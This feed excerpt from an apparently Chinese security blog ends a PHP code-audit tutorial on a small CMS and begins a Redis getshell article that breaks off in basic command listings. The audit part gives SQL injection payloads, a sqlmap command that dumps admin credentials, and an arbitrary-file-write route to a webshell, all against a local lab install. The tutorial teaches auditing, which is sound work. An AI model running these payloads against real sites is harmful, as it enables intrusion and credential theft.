src="http://image.v0w.top/Blog/2020-09-02-082635.png"></p><p>由于Seay审计工具以及类似产品的原理是通过规则匹配，查找可能存在问题和漏洞的点，比较好的是可以很快的给我列出很多可能存在漏洞的点。</p><p>但是有两个问题比较难以解决：</p><ol><li>如何通过这些代码的位置定位到功能点的位置。</li><li>规则匹配导致输出的漏洞点数量远远大于实际的风险漏洞的数量，需要消耗大量的精力复现和筛选，大部分时间都浪费在人工消除误报。</li></ol><p>基于以上两个原因，我开始尝试<strong>从功能点+调试的方式来找漏洞</strong>。</p><h1 id="0x03-从功能点调试的方式找漏洞"><a href="#0x03-从功能点调试的方式找漏洞" class="headerlink" title="0x03 从功能点调试的方式找漏洞"></a>0x03 从功能点调试的方式找漏洞</h1><p>所谓从功能点来找漏洞，顾名思义，就是通过搭建一个完整的环境（比如CMS等建站系统的环境），然后<strong>对常见的功能点进行测试，通过调试的方式来找到对应功能点的源码</strong>。在对源码进行审计，这样我们可以<strong>较为轻松的定位功能点和具体代码的对应关系，对整个代码的逻辑有更为清楚的认识</strong>。</p><p>以新秀企业建站系统为例，讲一讲如何通过调试方式对特定功能点进行检查，确认其是否存在漏洞。</p><h2 id="3-1-admin页面是否存在SQL注入"><a href="#3-1-admin页面是否存在SQL注入" class="headerlink" title="3.1 admin页面是否存在SQL注入"></a>3.1 admin页面是否存在SQL注入</h2><p>admin页面，通过<code>MySQLMonitor</code>监听SQL语句的执行情况，找到账号登录时的SQL语句。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-035352.png"></p><p>通过对这个SQL语句的一部分进行全project搜索，找到相应的代码点。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-040600.jpg"></p><p><strong>注意：此时的代码可能不是最终的SQL语句执行的代码点</strong>，但是没有关系，我们可以在这里下断点，然后在浏览器里执行相应的操作，比如我们这里是输入账号密码，登录。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-035518.jpg"></p><p>之后，因为下了断点，开启xdebug监听，我们可以step in，然后之后找到相应的SQL语句的位置，再对其源码进行审计。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-030634.jpg"></p><p>此处，明显还是使用了SQL语句的拼接，这个可能是存在问题的，但是是否存在SQL注入漏洞，我们还需要进一步验证。</p><p>比如我们这样：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username &#x3D; admin&#39; and sleep(2)#</span><br><span class="line">password &#x3D; 123</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-042319.png"></p><p>结果发现好像<code>&#39;</code>被转义了。</p><p>我们可以将断点往前面放一点：</p><p>发现这个小小的企业建站系统，竟然还做了不错的安全限制。</p><p>1.<code>include/function.php:426</code> safe函数对攻击IP封禁一段时间。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-055339.png"></p><p>2.<code>include/function.php:74</code> strict函数将一些危险字符替换成对应的HTML实体，确实可以防护很多的SQL注入攻击。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-055047.png"></p><p>然后我们就可以确认，admin的登录点不存在SQL注入。</p><p>其他的功能点也是一样，可以通过调试方式，非常轻松地定位到代码，然后审计一下代码的逻辑和危险函数的使用是否存在问题，基本上，所有功能点过一遍就差不多了。当然，全部过一遍之后，还可以再结合seay审计工具来查漏补缺一下。</p><p>我们再举一两个例子。</p><h2 id="3-2-前台搜索功能点SQL注入漏洞"><a href="#3-2-前台搜索功能点SQL注入漏洞" class="headerlink" title="3.2 前台搜索功能点SQL注入漏洞"></a>3.2 前台搜索功能点SQL注入漏洞</h2><p>先输入一个关键词，利用MySQLMonitor定位SQL语句。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-TEST&#x2F;</span><br></pre></td></tr></table></figure><p>找到测试的关键词，找到相应的SQL语句。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-073347.png"></p><p>对SQL语句的一部分进行全project的搜索，定位一下：</p><p><img src="http://image.v0w.top/Blog/2020-08-27-073906.jpg"></p><p>下断点，执行看看：</p><p>发现<code>index/module/search_main.php:2:module_search_main()函数</code>这里是SQL语句直接拼接了，而且不像之前经过过滤。</p><p><img src="http://image.v0w.top/Blog/2020-08-27-074311.png"></p><p>于是我们就有了这样的结果：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-%27UNION%20ALL%20SELECT%20NULL,NULL,database()--%20-</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-085057.png"></p><p>确定这里存在SQL注入之后，就可以通过sqlmap来进行利用。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;sinsiu:8888&#x2F;?&#x2F;search&#x2F;index.html&#x2F;key-%27*%20%23&#x2F;&quot; -v 3 -D susiu -T php_admin -C adm_id,adm_username,adm_password --dump</span><br></pre></td></tr></table></figure><p><img src="http://image.v0w.top/Blog/2020-08-27-085356.png"></p><p>我们很轻松的找到（fu xian）了一个漏洞。</p><h2 id="3-3-后台语言设置Getshell"><a href="#3-3-后台语言设置Getshell" class="headerlink" title="3.3 后台语言设置Getshell"></a>3.3 后台语言设置Getshell</h2><p>看了上面的两个例子，那么问题来了，如果说一个功能点他不直接和数据库交互，我们如何通过功能点来定位代码呢？</p><p>我的方法是，搜索一些特定字符串，听上去很傻，但是往往挺有效果的。</p><p>比如我们怀疑后台编辑语言文件的位置存在任意文件写入的问题导致getshell。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-012116.jpg"></p><p>那我们可以去搜索<strong>编辑语言包成功</strong>。在搜索一些关键词时，如果直接搜可能找不到，可以使用模糊查询或者正则表达式查询。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-012211.jpg"></p><p>前后结合一下，能够找到写文件的位置。之后，设置断点，进行测试，而且比较清晰的看到代码的执行过程。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-014140.jpg"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$path = post(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line">$lang_text = post(<span class="string">&#x27;lang_text&#x27;</span>,<span class="string">&#x27;no_filter&#x27;</span>);</span><br><span class="line">file_put_contents($path,$lang_text);</span><br></pre></td></tr></table></figure><p><code>$path</code>过了<code>strict</code>过滤器，<code>$lang_text</code>文件内容过了<code>no_filter</code>过滤器。</p><p><code>no_filter</code>过滤器就转义了一下，几乎相当于没有过滤，我们就可以任意文件写入。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//不过滤</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">no_filter</span>(<span class="params">$str</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(S_MAGIC_QUOTES_GPC)</span><br><span class="line">&#123;</span><br><span class="line">$str = stripslashes($str);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$path</code>也是可控的，所以就可以很轻松的写入shell。</p><p><img src="http://image.v0w.top/Blog/2020-08-28-014316.jpg"></p><p>当然，该方法虽然一般情况下的表现不错。但是，相比于通过seay审计工具挨个去看危险函数，<strong>该方法对源码的整体性以及漏洞的挖掘程度并不够</strong>。</p><h1 id="0x04-整体阅读代码"><a href="#0x04-整体阅读代码" class="headerlink" title="0x04 整体阅读代码"></a>0x04 整体阅读代码</h1><p>这种方法比较硬核。。。</p><p>本人尚菜，很少尝试这样去审计一个系统。</p><p>当然，对于一个比较小的系统，或者类似于CTF中的代码审计，可能只是有一个场景，<strong>整体代码量较小的情况</strong>下，会是非常不错的方式。不仅可以较为深入的挖掘漏洞，还可以较为深入的挖掘漏洞的成因，利用方式。比如比较流行的<strong>php反序列化的POP利用链</strong>。</p><h1 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h1><p>本文总结了php代码审计的常见三种方法。并以新秀企业建站系统为例，详细实战了功能点调试的方式找漏洞的方法：</p><ol><li>代码本身找漏洞</li><li>通过功能点调试的方式找漏洞</li><li>整体阅读代码找漏洞</li></ol><p>希望对读者在代码审计的入门有帮助。祝福各位师傅早日挖到属于自己的洞。</p><h1 id="0xFF-参考链接"><a href="#0xFF-参考链接" class="headerlink" title="0xFF 参考链接"></a>0xFF 参考链接</h1><ul><li><a href="https://www.sqlsec.com/2020/07/macphp.html">国光——macOS 下优雅地配置 PHP 代码审计环境</a></li><li><a href="https://www.sqlsec.com/2020/01/sinsiu.html">国光——PHP代码审计初次尝试之新秀企业网站系统</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;之前也做过一些代码审计，主要语言是PHP，大部分情况下，都是东一榔头西一棒，非常不优雅，甚至有时为了</summary>
      
    
    
    
    <category term="漏洞挖掘" scheme="v0w.top/categories/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    
    <category term="php" scheme="v0w.top/tags/php/"/>
    
    <category term="代码审计" scheme="v0w.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Redis与getshell</title>
    <link href="v0w.top/2020/08/05/Redis-getshell/"/>
    <id>v0w.top/2020/08/05/Redis-getshell/</id>
    <published>2020-08-04T16:00:00.000Z</published>
    <updated>2020-08-31T01:35:34.875Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>本文主要介绍redis技术是什么，有什么优势，有什么缺点。接着会从安全渗透的角度，剖析其存在的安全隐患，四种getshell的利用方式和防护策略。</p><h1 id="0x01-Redis简介"><a href="#0x01-Redis简介" class="headerlink" title="0x01 Redis简介"></a>0x01 Redis简介</h1><h2 id="1-1-Redis为什么诞生"><a href="#1-1-Redis为什么诞生" class="headerlink" title="1.1 Redis为什么诞生"></a>1.1 Redis为什么诞生</h2><p>首先，Redis是NoSQL的典型案例之一。那么为什么SQL（关系型数据库）用的好好的，突然出现一个NoSQL呢？</p><p>在Web应用发展的初期，那时关系型数据库受到了较为广泛的关注和应用，原因是因为那时候Web站点基本上访问和并发不高、交互也较少。而在后来，随着访问量的提升，使用关系型数据库的Web站点多多少少都开始在性能上出现了一些瓶颈，而瓶颈的源头一般是在磁盘的I/O上。而随着互联网技术的进一步发展，各种类型的应用层出不穷，这导致在当今云计算、大数据盛行的时代，对性能有了更多的需求，主要体现在以下四个方面：</p><ol><li>低延迟的读写速度：应用快速地反应能极大地提升用户的满意度</li><li>支撑海量的数据和流量：对于搜索这样大型应用而言，需要利用PB级别的数据和能应对百万级的流量</li><li>大规模集群的管理：系统管理员希望分布式应用能更简单的部署和管理</li><li>庞大运营成本的考量：IT部门希望在硬件成本、软件成本和人力成本能够有大幅度地降低</li></ol><p>为了克服这一问题，NoSQL应运而生，它同时具备了高性能、可扩展性强、高可用等优点，受到广泛开发人员和仓库管理人员的青睐。</p><h2 id="1-2-Redis是什么"><a href="#1-2-Redis是什么" class="headerlink" title="1.2 Redis是什么"></a>1.2 Redis是什么</h2><p>Redis是现在最受欢迎的NoSQL数据库之一，Redis是一个使用ANSI C编写的开源、包含多种数据结构、支持网络、基于内存、可选持久性的键值对存储数据库，其具备如下特性：</p><ul><li>基于内存运行，性能高效</li><li>支持分布式，理论上可以无限扩展</li><li>key-value存储系统</li><li>开源的使用ANSI C语言编写、遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API</li></ul><p>相比于其他数据库类型，Redis具备的特点是：</p><ul><li>C/S通讯模型</li><li>单进程单线程模型</li><li>丰富的数据类型</li><li>操作具有原子性</li><li>持久化</li><li>高并发读写</li><li>支持lua脚本</li></ul><p>哪些大厂在使用Redis？</p><ul><li>github</li><li>twitter</li><li>微博</li><li>Stack Overflow</li><li>阿里巴巴</li><li>百度</li><li>美团</li><li>搜狐</li></ul><h2 id="1-3-Redis应用场景"><a href="#1-3-Redis应用场景" class="headerlink" title="1.3 Redis应用场景"></a>1.3 Redis应用场景</h2><p>Redis 的应用场景包括：缓存系统（“热点”数据：高频读、低频写）、计数器、消息队列系统、排行榜、社交网络和实时系统。</p><h1 id="0x02-Redis基础知识"><a href="#0x02-Redis基础知识" class="headerlink" title="0x02 Redis基础知识"></a>0x02 Redis基础知识</h1><h2 id="2-1-Redis的数据类型"><a href="#2-1-Redis的数据类型" class="headerlink" title="2.1 Redis的数据类型"></a>2.1 Redis的数据类型</h2><p>五种自有数据类型：String类型、哈希类型、列表类型、集合类型和顺序集合类型。</p><h3 id="String类型"><a href="#String类型" class="headerlink" title="String类型"></a>String类型</h3><p>不仅能够存储字符串、还能存储图片、视频等多种类型, 最大长度支持512M。</p><p>对每种数据类型，Redis都提供了丰富的操作命令，如：</p><ul><li>GET/MGET</li><li>SET/SETEX/MSET/MSETNX</li><li>INCR/DECR</li><li>GETSET</li><li>DEL</li></ul><h3 id="哈希类型hash"><a href="#哈希类型hash" class="headerlink" title="哈希类型hash"></a>哈希类型hash</h3><p>该类型是由field和关联的value组成的map。其中，field和value都是字符串类型的。</p><p>Hash的操作命令如下：</p><ul><li>HGET/HMGET/HGETALL</li><li>HSET/HMSET/HSETNX</li><li>HEXISTS/HLEN</li><li>HKEYS/HDEL</li><li>HVALS</li></ul><h3 id="列表类型list："><a href="#列表类型list：" class="headerlink" title="列表类型list："></a>列表类型list：</h3><p>该类型是一个插入顺序排序的字符串元素集合, 基于双链表实现。</p><p>List的操作命令如下：</p><ul><li>LPUSH/LPUSHX/LPOP/RPUSH/RPUSHX/RPOP/LINSERT/LSET</li><li>LINDEX/LRANGE</li><li>LLEN/LTRIM</li></ul><h3 id="集合类型set："><a href="#集合类型set：" class="headerlink" title="集合类型set："></a>集合类型set：</h3><p>Set类型是一种无顺序集合, 它和List类型最大的区别是：集合中的元素没有顺序, 且元素是唯一的。</p><p>Set类型的底层是通过哈希表实现的，其操作命令为：</p><ul><li>SADD/SPOP/SMOVE/SCARD</li><li>SINTER/SDIFF/SDIFFSTORE/SUNION</li></ul><p>Set类型主要应用于：在某些场景，如社交场景中，通过交集、并集和差集运算，通过Set类型可以非常方便地查找共同好友、共同关注和共同偏好等社交关系。</p><h2 id="2-2-Redis特性"><a href="#2-2-Redis特性" class="headerlink" title="2.2 Redis特性"></a>2.2 Redis特性</h2><h3 id="Redis特性1：事务"><a href="#Redis特性1：事务" class="headerlink" title="Redis特性1：事务"></a>Redis特性1：事务</h3><ul><li>命令序列化，按顺序执行</li><li>原子性</li><li>三阶段: 开始事务 - 命令入队 - 执行事务</li><li>命令：MULTI/EXEC/DISCARD</li></ul><h3 id="Redis特性2：发布订阅-Pub-Sub"><a href="#Redis特性2：发布订阅-Pub-Sub" class="headerlink" title="Redis特性2：发布订阅(Pub/Sub)"></a>Redis特性2：发布订阅(Pub/Sub)</h3><ul><li>Pub/sub是一种消息通讯模式</li><li>Pub发送消息, Sub接受消息</li><li>Redis客户端可以订阅任意数量的频道</li><li>“fire and forgot”, 发送即遗忘</li><li>命令：Publish/Subscribe/Psubscribe/UnSub</li></ul><p>　　<img src="http://image.v0w.top/Blog/2020-08-09-092255.png"></p><h3 id="Redis特性3：Stream"><a href="#Redis特性3：Stream" class="headerlink" title="Redis特性3：Stream"></a>Redis特性3：Stream</h3><ul><li>Redis 5.0新增</li><li>等待消费</li><li>消费组(组内竞争)</li><li>消费历史数据</li><li>FIFO</li></ul><p><img src="http://image.v0w.top/Blog/2020-08-09-092350.jpg"></p><h2 id="2-3-Redis的命令"><a href="#2-3-Redis的命令" class="headerlink" title="2.3 Redis的命令"></a>2.3 Redis的命令</h2><p>最详细的命令还是要参考手册</p><ul><li><a href="https://www.redis.net.cn/order/">https://www.redis.net.cn/order/</a></li><li><a href="http://redisdoc.com/">http://redisdoc.com/</a></li><li><a href="http://redisguide.com/">http://redisguide.com/</a></li></ul><h3 id="2-3-1-Redis连接"><a href="#2-3-1-Redis连接" class="headerlink" title="2.3.1 Redis连接"></a>2.3.1 Redis连接</h3><p><strong>本地连接</strong></p><p>确定本地redis服务启动后。启动 redis 客户端，打开终端并输入命令 redis-cli。该命令会连接本地的 redis 服务。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;redis-server# 启动redis服务</span><br><span class="line"></span><br><span class="line"> .&#x2F;redis-cli# 启动redis客户端，连接本地服务</span><br><span class="line">127.0.0.1:6379&gt; PING# 测试redis的连通性</span><br><span class="line">PONG</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>远程连接</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ redis-cli -h host -p port -a password</span><br></pre></td></tr></table></figure><h3 id="2-3-2-获取Redis信息"><a href="#2-3-2-获取Redis信息" class="headerlink" title="2.3.2 获取Redis信息"></a>2.3.2 获取Redis信息</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INFO# 查看信息</span><br><span class="line"># Server</span><br><span class="line">redis_version:6.0.6</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">KEYS *# 看所有键</span><br><span class="line">1) &quot;key&quot;</span><br><span class="line">2) &quot;key-with-expire-time&quot;</span><br><span class="line"></span><br><span class="line">flushall# 删除所有数据库内容</span><br><span class="line"></span><br><span class="line">flushdb# 刷新数据库</span><br><span class="line"></span><br><span class="line">config set dir dirpath 设置路径等配置</span><br><span class="line"></span><br><span class="line">config get dir&#x2F;dbfilename 获取路径及数据配置信息</span><br><span class="line">1) &quot;dir&quot;</span><br><span class="line">2) &quot;&#x2F;usr&#x2F;local&#x2F;redis&#x2F;src&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2-3-3-String-类型命令"><a href="#2-3-3-String-类型命令" class="headerlink" title="2.3.3 String 类型命令"></a>2.3.3 String 类型命令</h3><p>String 介绍稍微详细一点，其他的也是类似的，所以就简单介绍。</p><p><strong>SET 系列</strong></p><ol><li><p><code>SET key value [EX seconds] [PX milliseconds] [NX|XX]</code> </p><p>将字符串值 <code>value</code> 关联到 <code>key</code> 。</p><p>如果 <code>key</code> 已经持有其他值， <code>SET</code> 就覆写旧值， 无视类型。</p></li><li><p><code>SETNX key value</code></p><p>只在键 <code>key</code> 不存在的情况下， 将键 <code>key</code> 的值设置为 <code>value</code> 。</p><p>若键 <code>key</code> 已经存在， 则 <code>SETNX</code> 命令不做任何动作。</p><p><code>SETNX</code> 是『SET if Not eXists』(如果不存在，则 SET)的简写。</p></li><li><p><code>SETEX key seconds value</code></p><p>将键 <code>key</code> 的值设置为 <code>value</code> ， 并将键 <code>key</code> 的生存时间设置为 <code>seconds</code> 秒钟。</p><p>如果键 <code>key</code> 已经存在， 那么 <code>SETEX</code> 命令将覆盖已有的值。</p></li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对不存在的键进行设置：</span><br><span class="line">redis&gt; SET key &quot;value&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key</span><br><span class="line">&quot;value&quot;</span><br><span class="line"></span><br><span class="line">对已存在的键进行设置：</span><br><span class="line">redis&gt; SET key &quot;new-value&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key</span><br><span class="line">&quot;new-value&quot;</span><br><span class="line"></span><br><span class="line">使用 EX 选项：将键的过期时间设置为 seconds 秒。</span><br><span class="line">redis&gt; SET key-with-expire-time &quot;hello&quot; EX 10086</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key-with-expire-time</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">redis&gt; TTL key-with-expire-time</span><br><span class="line">(integer) 10069</span><br><span class="line"></span><br><span class="line">使用 PX 选项：将键的过期时间设置为 milliseconds 毫秒。</span><br><span class="line">redis&gt; SET key-with-pexpire-time &quot;moto&quot; PX 123321</span><br><span class="line">OK</span><br><span class="line">redis&gt; GET key-with-pexpire-time</span><br><span class="line">&quot;moto&quot;</span><br><span class="line">redis&gt; PTTL key-with-pexpire-time</span><br><span class="line">(integer) 111939</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 NX 选项：只在键不存在时， 才对键进行设置操作</span><br><span class="line">redis&gt; SET not-exists-key &quot;value&quot; NX</span><br><span class="line">OK      # 键不存在，设置成功</span><br><span class="line">redis&gt; GET not-exists-key</span><br><span class="line">&quot;value&quot;</span><br><span class="line">redis&gt; SET not-exists-key &quot;new-value&quot; NX</span><br><span class="line">(nil)   # 键已经存在，设置失败</span><br><span class="line">redis&gt; GEt not-exists-key</span><br><span class="line">&quot;value&quot; # 维持原值不变</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">使用 XX 选项：只在键已经存在时， 才对键进行设置操作</span><br><span class="line">redis&gt; EXISTS exists-key</span><br><span class="line">(integer) 0</span><br><span class="line">redis&gt; SET exists-key &quot;value&quot; XX</span><br><span class="line">(nil)   # 因为键不存在，设置失败</span><br><span class="line">redis&gt; SET exists-key &quot;value&quot;</span><br><span class="line">OK      # 先给键设置一个值</span><br><span class="line">redis&gt; SET exists-key &quot;new-value&quot; XX</span><br><span class="line">OK      # 设置新值成功</span><br><span class="line">redis&gt; GET exists-key</span><br><span class="line">&quot;new-value&quot;</span><br></pre></td></tr></table></figure><p><strong>GET系列</strong></p><p><code>GET key</code>: 如果键 <code>key</code> 不存在， 那么返回特殊值 <code>nil</code> ； 否则， 返回键 <code>key</code> 的值。</p><p>如果键 <code>key</code> 的值并非字符串类型， 那么返回一个错误， 因为 <code>GET</code> 命令只能用于字符串值。</p><p><code>GETSET key value</code>: 将键 <code>key</code> 的值设为 <code>value</code> ， 并返回键 <code>key</code> 在被设置之前的旧值。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">edis&gt; GETSET db mongodb    # 没有旧值，返回 nil</span><br><span class="line">(nil)</span><br><span class="line"></span><br><span class="line">redis&gt; GET db</span><br><span class="line">&quot;mongodb&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; GETSET db redis      # 返回旧值 mongodb</span><br><span class="line">&quot;mongodb&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; GET db</span><br><span class="line">&quot;redis&quot;</span><br></pre></td></tr></table></figure><p><strong>APPEND key value</strong></p><p>如果键 <code>key</code> 已经存在并且它的值是一个字符串， <code>APPEND</code> 命令将把 <code>value</code> 追加到键 <code>key</code> 现有值的末尾。</p><p>如果 <code>key</code> 不存在， <code>APPEND</code> 就简单地将键 <code>key</code> 的值设为 <code>value</code> ， 就像执行 <code>SET key value</code> 一样。</p><p>追加 <code>value</code> 之后， 返回键 <code>key</code> 的值的长度。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">对不存在的 key 执行 APPEND ：</span><br><span class="line"></span><br><span class="line">redis&gt; EXISTS myphone               # 确保 myphone 不存在</span><br><span class="line">(integer) 0</span><br><span class="line">redis&gt; APPEND myphone &quot;nokia&quot;       # 对不存在的 key 进行 APPEND ，等同于 SET myphone &quot;nokia&quot;</span><br><span class="line">(integer) 5                         # 字符长度</span><br><span class="line"></span><br><span class="line">对已存在的字符串进行 APPEND ：</span><br><span class="line"></span><br><span class="line">redis&gt; APPEND myphone &quot; - 1110&quot;     # 长度从 5 个字符增加到 12 个字符</span><br><span class="line">(integer) 12</span><br><span class="line">redis&gt; GET myphone</span><br><span class="line">&quot;nokia - 1110&quot;</span><br></pre></td></tr></table></figure><p><strong>STRLEN key</strong></p><p>返回键 <code>key</code> 储存的字符串值的长度。</p><p>获取字符串值的长度：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET mykey &quot;Hello world&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; STRLEN mykey</span><br><span class="line">(integer) 11</span><br></pre></td></tr></table></figure><p>不存在的键的长度为 <code>0</code> ：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; STRLEN nonex</span><br></pre></td></tr></table></figure><p><strong>APPEND key value</strong></p><p>如果键 <code>key</code> 已经存在并且它的值是一个字符串， <code>APPEND</code> 命令将把 <code>value</code> 追加到键 <code>key</code> 现有值的末尾。</p><p>如果 <code>key</code> 不存在， <code>APPEND</code> 就简单地将键 <code>key</code> 的值设为 <code>value</code> ， 就像执行 <code>SET key value</code> 一样。</p><p><strong>SETRANGE key offset value</strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET greeting &quot;hello world&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; SETRANGE greeting 6 &quot;Redis&quot;</span><br><span class="line">(integer) 11</span><br><span class="line"></span><br><span class="line">redis&gt; GET greeting</span><br><span class="line">&quot;hello Redis&quot;</span><br></pre></td></tr></table></figure><p><strong>GETRANGE key start end</strong></p><p>返回键 <code>key</code> 储存的字符串值的指定部分， 字符串的截取范围由 <code>start</code> 和 <code>end</code> 两个偏移量决定 (包括 <code>start</code> 和 <code>end</code> 在内)。</p><p>负数偏移量表示从字符串的末尾开始计数， <code>-1</code> 表示最后一个字符， <code>-2</code> 表示倒数第二个字符， 以此类推。</p><p><code>GETRANGE</code> 通过保证子字符串的值域(range)不超过实际字符串的值域来处理超出范围的值域请求。</p><p>类似SubStr命令。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET greeting &quot;hello, my friend&quot;</span><br><span class="line">OK</span><br><span class="line">redis&gt; GETRANGE greeting 0 4          # 返回索引0-4的字符，包括4。</span><br><span class="line">&quot;hello&quot;</span><br><span class="line">redis&gt; GETRANGE greeting -1 -5        # 不支持回绕操作</span><br><span class="line">&quot;&quot;</span><br><span class="line">redis&gt; GETRANGE greeting -3 -1        # 负数索引</span><br><span class="line">&quot;end&quot;</span><br><span class="line">redis&gt; GETRANGE greeting 0 -1         # 从第一个到最后一个</span><br><span class="line">&quot;hello, my friend&quot;</span><br><span class="line">redis&gt; GETRANGE greeting 0 1008611    # 值域范围不超过实际字符串，超过部分自动被符略</span><br><span class="line">&quot;hello, my friend&quot;</span><br></pre></td></tr></table></figure><p><strong>MSET key value [key value …]</strong></p><p>同时对多个键进行设置：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; MSET date &quot;2012.3.30&quot; time &quot;11:00 a.m.&quot; weather &quot;sunny&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET date time weather</span><br><span class="line">1) &quot;2012.3.30&quot;</span><br><span class="line">2) &quot;11:00 a.m.&quot;</span><br><span class="line">3) &quot;sunny&quot;</span><br></pre></td></tr></table></figure><p>覆盖已有的值：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; MGET k1 k2</span><br><span class="line">1) &quot;hello&quot;</span><br><span class="line">2) &quot;world&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; MSET k1 &quot;good&quot; k2 &quot;bye&quot;</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET k1 k2</span><br><span class="line">1) &quot;good&quot;</span><br><span class="line">2) &quot;bye&quot;</span><br></pre></td></tr></table></figure><p><strong>MGET key [key …]</strong></p><p>返回给定的一个或多个字符串键的值。</p><p>如果给定的字符串键里面， 有某个键不存在， 那么这个键的值将以特殊值 <code>nil</code> 表示。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">redis&gt; SET redis redis.com</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; SET mongodb mongodb.org</span><br><span class="line">OK</span><br><span class="line"></span><br><span class="line">redis&gt; MGET redis mongodb</span><br><span class="line">1) &quot;redis.com&quot;</span><br><span class="line">2) &quot;mongodb.org&quot;</span><br><span class="line"></span><br><span class="line">redis&gt; MGET redis mongodb mysql     # 不存在的 mysql 返回 nil</span><br><span class="line">1) &quot;redis.com&quot;</span><br><span class="line">2) &quot;mongodb.org&quot;</span><br><span class="line">3) (nil)</span><br></pre></td></tr></table></figure><p><strong>DEL key</strong></p><p>删除key对应的键值数据。</p><h3 id="2-3-4-hash类型命令"><a href="#2-3-4-hash类型命令" class="headerlink" title="2.3.4 hash类型命令"></a>2.3.4 hash类型命令</h3><p>类似一个对象或者结构体。</p><p><strong>应用场景：</strong></p><p>我们要存储一个用户信息对象数据，其中包括用户ID、用户姓名、年龄和生日，通过用户ID我们希望获取该用户的姓名或者年龄或者生日；</p><p><strong>实现方式：</strong></p><p>Redis的Hash实际是内部存储的Value为一个HashMap，并提供了直接存取这个Map成员的接口。如图所示，Key是用户ID, value是一个Map。这个Map的key是成员的属性名，value是属性值。这样对数据的修改和存取都可以直接通过其内部Map的Key(Redis里称内部Map的key为field), 也就是通过 key(用户ID) + field(属性标签) 就可以操作对应属性数据。</p><p><strong>如图所示：</strong></p><p><img src="http://image.v0w.top/Blog/2020-08-09-123507.jpg"></p><p><strong>常用命令</strong></p><ul><li>hget hash field</li><li>hset hash field value</li><li>hgetall hash</li><li>hmset key field value [f v…]</li><li>HKEYS key</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379[4]&gt; HSET 1 name &quot;V0WKeep3r&quot; brith 1998 age 22</span><br><span class="line">(integer) 3</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; Hget 1 name</span><br><span class="line">&quot;V0WKeep3r&quot;</span><br><span class="line"></span><br><span class="line">127.0.0.1:6379[4]&gt; 